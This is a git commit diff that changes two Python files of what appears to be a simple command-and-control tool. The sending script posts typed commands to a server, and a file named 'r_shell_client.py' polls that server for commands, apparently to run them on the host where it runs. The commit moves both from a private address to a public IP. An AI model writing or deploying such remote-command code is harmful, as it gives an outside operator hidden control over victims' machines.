04ac48822cfa9eb7a6683855f873cb7fa9b31d3b
Ömer Özhan <omer.ozhan@andela.com>
2022-09-12 22:38:07 +0300

    siu

--- command_api.py
+++ command_api.py
@@ -1,4 +1,4 @@
 from requests import post
 
 while True:
-    print(post("http://10.120.0.243:5000/update_command", data={"command": input("Command To Execute: ")}))
+    print(post("http://139.144.67.163/update_command", data={"command": input("Command To Execute: ")}))
--- r_shell_client.py
+++ r_shell_client.py
@@ -3,7 +3,7 @@ import urllib.request
 import time
 
 while True:
-    with urllib.request.urlopen('http://10.120.0.243:5000/commander') as response:
+    with urllib.request.urlopen('http://139.144.67.163/commander') as response:
         command_data = response.read().decode("utf-8")
 
         if not command_data == "No Action":
